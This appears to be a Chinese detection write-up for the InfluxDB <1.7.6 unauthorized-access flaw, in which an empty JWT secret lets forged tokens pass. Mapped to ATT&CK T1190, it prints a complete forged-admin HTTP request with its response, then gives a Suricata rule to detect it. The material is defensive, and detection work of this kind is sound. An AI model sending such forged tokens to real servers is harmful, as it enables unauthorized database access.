# T1190-Influxdb<1.7.6未授权访问漏洞

## 来自ATT&CK的描述

使用软件，数据或命令来利用面向Internet的计算机系统或程序中的弱点，从而导致意外或无法预期的行为。系统的弱点可能是错误、故障或设计漏洞。这些应用程序通常是网站，但是可以包括数据库（例如SQL），标准服务（例如SMB 或SSH）以及具有Internet可访问开放的任何其他应用程序，例如Web服务器和相关服务。根据所利用的缺陷，这可能包括“利用防御防卫”。

如果应用程序托管在基于云的基础架构上，则对其进行利用可能会导致基础实际应用受到损害。这可以使攻击者获得访问云API或利用弱身份和访问管理策略的路径。

对于网站和数据库，OWASP排名前10位和CWE排名前25位突出了最常见的基于Web的漏洞。

## 测试案例

InfluxDB是一个使用Go语言编写的开源分布式，支持高并发的时序数据库，其使用JWT作为鉴权方式。在用户开启了认证，但未设置参数shared-secret的情况下，JWT的认证密钥为空字符串，此时攻击者可以伪造任意用户身份在InfluxDB中执行SQL语句。

影响版本：Influxdb < 1.7.6

## 检测日志

HTTP

## 测试复现

具体测试过程请参考：<https://blog.csdn.net/weixin_43416469/article/details/113843301>

## 测试留痕

```yml
POST /query HTTP/1.1
Host: 10.7.2.106:8086
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjE2MjM5MDIyfQ.9ZTT-ppj20hPXZaUoSxTWf0Mei-idhAU2FaoaQgJJm8
Accept-Language: zh-CN,zh;q=0.9,be;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 26

db=sample&q=show+users

HTTP/1.1 200 OK
Content-Encoding: gzip
Content-Type: application/json
Request-Id: 19c6cf88-1a5b-11eb-800c-000000000000
X-Influxdb-Build: OSS
X-Influxdb-Version: 1.6.6
X-Request-Id: 19c6cf88-1a5b-11eb-800c-000000000000
Date: Fri, 30 Oct 2020 02:53:34 GMT
Connection: close
Transfer-Encoding: chunked

69
..........,.=
. .D...So..^E$H.BP...Fr.`....{.....!N.e....Z...e....h...pe.!.^......*~.L.S..~w......8..c...
0
```

## 检测规则/思路

### Suricata规则

```s
alert http any any -> any any (msg:"Influxdb<1.7.6未授权访问";flow:established,to_server;content:"POST";http_method;content:"/query";http_uri;content:"db=sample&q=show+users";http_client_body;reference:url,blog.csdn.net/weixin_43416469/article/details/113843301;classtype:web-application-attck;sid:3002021;rev:1;)
```

### 建议

流量+安全设备较容易检测到此攻击行为。

## 参考推荐

MITRE-ATT&CK-T1190

<https://attack.mitre.org/techniques/T1190/>

influxdb未授权访问漏洞

<https://blog.csdn.net/weixin_43416469/article/details/113843301>
